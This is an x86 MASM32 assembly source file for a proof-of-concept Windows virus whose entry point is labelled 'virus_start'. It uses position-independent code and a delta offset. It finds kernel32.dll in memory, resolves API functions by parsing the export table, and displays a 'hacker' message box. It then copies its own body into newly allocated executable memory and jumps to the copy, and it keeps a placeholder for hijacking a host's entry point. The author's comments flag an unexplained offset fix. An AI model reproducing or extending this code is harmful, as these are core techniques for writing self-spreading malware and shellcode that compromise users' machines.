; getMsgBox.asm
; MASM32 asm program for Intel i386 processors running Windows 32bits
; By Deb0ch.

.386
.model flat, stdcall
option casemap:none

.code

begin_copy:

; ¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤
; DATA (inside .code section)
; ¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤

    oldEntryPoint           dd 42424242h
    msgOfVictory            db "H4 h4 h4, J3 5u15 1 H4CK3R !!!", 0

; *** DLL names: ***

    kernel32_dll_name       db "Kernel32.dll", 0
    user32_dll_name         db "User32.dll", 0

; *** function names: ***

    getProcAddress_name     db "GetProcAddress", 0
    loadLibrary_name        db "LoadLibraryA", 0
    messagebox_name         db "MessageBoxA", 0
    virtualalloc_name       db "VirtualAlloc", 0
    virtualprotect_name     db "VirtualProtect", 0

; ¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤
; DATA (inside .code section) - END
; ¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤


; ¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤
; PROCEDURES
; ¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤


; int   my_strcmp(char *, char *)
; (edi, esi) -> eax
; Compares 2 strings strcmp-style.
my_strcmp PROC NEAR

    push    edi
    push    esi
    push    ebx                         ; Saving registers that we will use

loop_beg:
    cmp     byte ptr [edi], 0
    jz      loop_end                    ; if (str1[i] == '\0') then exit loop
    mov     bl, byte ptr [edi]
    cmp     byte ptr [esi], bl
    jnz     loop_end                    ; if (str1[i] != str2[i]) then exit loop
    inc     edi
    inc     esi
    jmp     loop_beg

loop_end:
    movzx   eax, byte ptr [edi]
    movzx   ebx, byte ptr [esi]
    sub     eax, ebx

    pop     ebx
    pop     esi
    pop     edi                         ; restore borrowed registers

    ret
my_strcmp ENDP


; void* memcpy(void *dest, void *src, size_t n)
; (edi, esi, edx) -> eax	
my_memcpy PROC NEAR

    push    edi
    push    esi
    push    ebx                         ; Saving registers that we will use

    test    edi, edi                    ; Test if dest is NULL	
    je      lbl_result
    test    esi, esi                    ; Test if src is NULL	
    je      lbl_result
    test    edx, edx                    ; Test if n is zero	
    je      lbl_result
    xor     ecx, ecx
    xor     ebx, ebx

lbl_loop:
    mov     bl, BYTE ptr [esi + ecx]
    mov     BYTE ptr [edi + ecx], bl
    inc     ecx
    cmp     ecx, edx
    jb      lbl_loop

lbl_result:
    mov     eax, edi

    pop     ebx
    pop     esi
    pop     edi                         ; restore borrowed registers

    ret
my_memcpy ENDP


; void *memset(void *s, int c, size_t n)
; (edi, esi, edx) -> eax
my_memset PROC NEAR

    push    ebx
    push    edx

    mov     eax, edi
    mov     ecx, edi
    lea     ebx, [edi + edx]
    test    edi, edi                    ; Test if s is NULL
    je      lbl_end

lbl_loop:
    mov     edx, esi
    mov     BYTE ptr [ecx], dl
    inc     ecx
    cmp     ecx, ebx
    jb      lbl_loop

lbl_end:
    pop     edx
    pop     ebx

    ret
my_memset ENDP

; ¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤

; ¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤
; eax: reserved for proc and func return values.
; ebx: delta offset
; esi: Keep track of where we need to be in the kernel32.dll.
; ¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤

virus_start:                            ; *** ENTRY *** ENTRY *** ENTRY *** ENTRY *** ENTRY *** ENTRY *** ENTRY *** ENTRY *** ENTRY *** ENTRY *** ENTRY *** ENTRY *** ENTRY *** 

    mov     esi, [esp]                  ; Look for last eip which was in kernel32.dll, and is now on the stack.

    call    delta_offset				; Get delta offset for position independence.
delta_offset:
    pop     ebx
    sub     ebx, delta_offset           ; now ebx == delta offset. Add it to any address which is inside this program to be position independant.

main PROC NEAR

; Function addresses
	LOCAL	loadLibrary_addr:DWORD
    LOCAL   getProcAddress_addr:DWORD
	LOCAL	messagebox_addr:DWORD
	LOCAL	virtualalloc_addr:DWORD
	LOCAL	virtualprotect_addr:DWORD

; Other variables
	LOCAL	imageBase:DWORD
	LOCAL	sizecopy:DWORD
	LOCAL	newcode:DWORD

    and     esi, 0FFFF0000h             ; mask address inside k32.dll to get page aligned like sections.

search_k32:
    sub     esi, 1000h                  ; Going back and back, keeping the page/section alignment.
    cmp     word ptr [esi], "ZM"        ; Looking for the "MZ" signature of a DOS header. "ZM" for endianess.
    jne     search_k32

    mov     imageBase, esi              ; imageBase = Real BaseAdress (for sure).

    add     esi, [esi + 3Ch]            ; Offset of the PE header. Now esi -> PE header
    cmp     word ptr [esi], "EP"
    jne     exit

; --------------------------------------> esi now contains the addres of kernel32.dll's IMAGE_NT_HEADERS.

    add     esi, 18h                    ; esi -> IMAGE_OPTIONAL_HEADER

    cmp     word ptr [esi], 10bh        ; IMAGE_OPTIONAL_HEADER magic number for 32bits programs
    jne     exit

    add     esi, 60h                    ; esi -> DataDirectory[0] (=> export_table)
    mov     esi, dword ptr [esi]        ; esi -> export_table (type IMAGE_EXPORT_DIRECTORY) (RVA)

    add     esi, imageBase              ; esi -> export table directory (type IMAGE_EXPORT_DIRECTORY) (VA)

; --------------------------------------> Now, we want to find our function's string symbol and get its index in the export name pointer table.

    mov     edx, [esi + 20h]            ; edx -> export name pointer table (RVA)
    add     edx, imageBase              ; edx -> export name pointer table (VA)

    push    edx                         ; save edx for next function to be found (LoadLibrary).
    push    esi                                         ; Save esi and
    lea     esi, [ebx + offset getProcAddress_name]     ; use it for storing the reference name.
    xor     ecx, ecx                    ; ecx = counter. Will contain the symbol's offset in the array.

browse_export_names:
    mov     edi, [edx + ecx]            ; edi -> symbol string name (RVA)
    add     edi, imageBase              ; edi -> symbol string name (VA)
    add     ecx, sizeof dword           ; edx -> next symbol (VA)

    call    my_strcmp                   ; strcmp between edi and esi.
    cmp     eax, 0
    jne     browse_export_names         ; eax == 0 means that match was found, we can exit the loop.


    pop     esi                         ; esi -> export_table (type IMAGE_EXPORT_DIRECTORY) (VA).

    mov     edx, [esi + 1ch]            ; edx -> export adress table (RVA)
    add     edx, ecx                    ; edx -> address of previously found function's RVA. (RVA)
    add     edx, imageBase              ; edx -> address of previously found function's RVA. (VA)

    mov     edx, [edx]                  ; edx == address of previously found function (RVA)
    add     edx, imageBase              ; edx == address of previously found function (VA)
    mov     getProcAddress_addr , edx

; --------------------------------------> GetProcAddress's VA is now saved in getProcAddress_addr. Yay !!!
; --------------------------------------> Now let's find LoadLibrary's address !

    pop     edx                         ; edx -> export name pointer table (VA)

    push    esi                                     ; Save esi and
    lea     esi, [ebx + offset loadLibrary_name]    ; use it for storing the reference name.
    xor     ecx, ecx                                ; ecx = counter. Will contain the symbol's offset in the array.

browse_export_names2:
    mov     edi, [edx + ecx]            ; edi -> symbol string name (RVA)
    add     edi, imageBase              ; edi -> symbol string name (VA)
    add     ecx, sizeof dword           ; edx -> next symbol (VA)

    call    my_strcmp                   ; strcmp between edi and esi.
    cmp     eax, 0
    jne     browse_export_names2        ; eax == 0 means that match was found, we can exit the loop.


    pop     esi                         ; esi -> export_table (type IMAGE_EXPORT_DIRECTORY) (VA).

    mov     edx, [esi + 1ch]            ; edx -> export adress table (RVA)
    sub     ecx, 4                      ; WHAAAAAAAAAAT ?????? What the hell is that offset !?!?!?!?!?!?!?!?
    add     edx, ecx                    ; edx -> address of previously found function's RVA. (RVA)
    add     edx, imageBase              ; edx -> address of previously found function's RVA. (VA)

    mov     edx, [edx]                  ; edx == address of previously found function (RVA)
    add     edx, imageBase              ; edx == address of previously found function (VA)
    mov     loadLibrary_addr, edx

; --------------------------------------> LoadLibrary's VA is now saved in getProcAddress_addr. Yay !!!
; --------------------------------------> Now we can use these functions to load any function from any dll on the system. Yay =D

    lea     edx, [ebx + offset user32_dll_name]     ;
    push    edx                                     ;
    call    loadLibrary_addr                        ;
    lea     edx, [ebx + offset messagebox_name]     ;
    push    edx                                     ;
    push    eax                                     ;
    call    getProcAddress_addr                     ;
    mov     messagebox_addr, eax                    ; Sequence of instructions to load a function from a dll.

    lea     edx, [ebx + offset kernel32_dll_name]   ;
    push    edx                                     ;
    call    loadLibrary_addr                        ;
    lea     edx, [ebx + offset virtualalloc_name]   ;
    push    edx                                     ;
    push    eax                                     ;
    call    getProcAddress_addr                     ;
    mov     virtualalloc_addr, eax                  ; Sequence of instructions to load a function from a dll.

    lea     edx, [ebx + offset kernel32_dll_name]   ;
    push    edx                                     ;
    call    loadLibrary_addr                        ;
    lea     edx, [ebx + offset virtualprotect_name] ;
    push    edx                                     ;
    push    eax                                     ;
    call    getProcAddress_addr                     ;
    mov     virtualprotect_addr, eax                ; Sequence of instructions to load a function from a dll.

    push    0                                       ;
    push    offset msgOfVictory                     ;
    push    offset msgOfVictory                     ;
    push    0                                       ;
    call    messagebox_addr                         ; Messagebox of VICTORY !!!

    mov     ecx, end_copy
    sub     ecx, begin_copy
    mov     sizecopy, ecx                           ; get the size to copy

    push    04h
    push    00001000h
    push    sizecopy
    push    0
    call    virtualalloc_addr
    mov     newcode, eax                            ; allocate some mem with read/write permissions

    mov     edi, newcode
    mov     esi, begin_copy
    mov     edx, sizecopy
    call    my_memcpy

    push    edx                                     ; save edx
    mov     edx, esp
    sub     edx, 4                                  ; making a fake pointer to an int for the virtualprotect function
 
    push    edx
    push    10h
    push    sizecopy
    push    newcode
    call    virtualprotect_addr                     ; modifies the access permissions to 'execute'.

    pop     edx                                     ; restore edx

    mov     esi, imageBase
    add     esi, 13200h
    push    esi                                     ; Simulate the "old eip in k32.dll" technic that we use in the beginning of the code

    mov     ecx, virus_start
    sub     ecx, begin_copy
    add     ecx, newcode
    jmp     ecx

exit:
    ret

main ENDP

end_copy:

end virus_start
